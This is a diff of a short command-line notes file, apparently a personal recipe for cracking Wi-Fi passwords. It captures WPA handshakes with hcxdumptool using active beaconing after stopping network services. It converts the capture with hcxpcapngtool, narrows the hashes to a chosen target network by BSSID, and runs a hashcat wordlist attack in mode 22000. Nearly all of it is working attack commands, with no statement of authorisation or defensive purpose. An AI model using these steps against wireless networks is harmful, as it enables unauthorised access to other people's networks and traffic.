@@ -7,15 +7,19 @@ sudo apt-get install hcxdumptool
 # You need to check you have wlan device
 iwconfig
 
-# Stop network
+# Stop network service
 sudo systemctl stop wpa_supplicant.service
 sudo systemctl stop NetworkManager.service
 
 # Start get wifi cap
-hcxdumptool -i wlan0 -o filename.pcapng --active_beacon --enable_status=1
+sudo hcxdumptool -i wlan0 -o filename.pcapng --active_beacon --enable_status=1
 
-# Start crack wifi password
-hashcat -m 22000 hash.hc22000 wordlist.txt
+# Restart network service
+sudo systemctl start wpa_supplicant.service
+sudo systemctl start NetworkManager.service
+
+# Convert to cracing file // filename.pcapng -> hash.hc22000
+hcxpcapngtool -o hash.hc22000 -E essidlist filename.pcapng
 
 
 -------------#  If you want to crack specific wifi network     
@@ -25,6 +29,14 @@ sudo hcxdumptool --do_rcascan -i wlan0
 // You need to delete other wifi network. # You can use bssid to find target wifi
 nano hash.hc
 -------------#
+
+
+# Start crack wifi password
+hashcat -m 22000 hash.hc22000 wordlist.txt
+
+
+
+
 
 
 
